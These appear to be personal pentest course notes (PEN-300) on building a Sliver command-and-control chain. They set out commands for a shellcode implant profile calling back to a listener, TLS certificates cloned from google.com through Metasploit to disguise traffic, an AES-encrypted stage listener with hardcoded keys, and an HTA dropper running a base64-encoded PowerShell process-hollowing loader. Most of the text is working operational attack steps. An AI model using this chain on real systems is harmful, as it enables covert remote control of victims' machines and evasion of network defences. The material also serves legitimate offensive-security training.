# Overview

# Sliver Setup
## Create profile local64 and point to port 443
`sliver > profiles new --http 192.168.45.227:443 --format shellcode local64`

## Setup certs with metasploit
`msfconsole -q -x "use auxiliary/gather/impersonate_ssl; set RHOST www.google.com; run; exit"`
Then save the .crt and .key files into an appropriate folder for easy reference

## Setup main listener with google.crt / key generated with metasploit
`sliver > https -L 192.168.45.227 -l 443 -c /home/kali/Desktop/PEN-300/sliver/sslCerts/google.crt -k /home/kali/Desktop/PEN-300/sliver/sslCerts/google.key`

## Setup the main stager with unzip key / decryption keys 
`sliver > stage-listener --url https://192.168.45.227:8064 --profile local64 -c /home/kali/Desktop/PEN-300/sliver/sslCerts/google.crt -k /home/kali/Desktop/PEN-300/sliver/sslCerts/google.key -C deflate9 --aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV`

# Sliver HTA Payload overview
the payload is specific to the Process Hollowing payload that works with the https sliver profile
Run the powershell encoder to convert the sliver.ps1 to usable format for the hta powershell code runner within hta file

## Modify the runner.xml
Modify the runner.xml and change the ip address and runner.ps1 (or .txt) which will be the shell code runner, reference the PEN-300/sliver folder for simple shell code runner .ps1 

## Encoding
The xml requires base64 encoding and placed into the runner.hta file within the powershell command to execute the mshta file. 
`PS Z:\SharedVMFolder\ToolLibrary\Sliver-AdvancedHTTPs-HTA-Loader> .\HTA-powershellEncoder.ps1`
Copy and paste the output from the encoded.txt file into the runner.hta file. 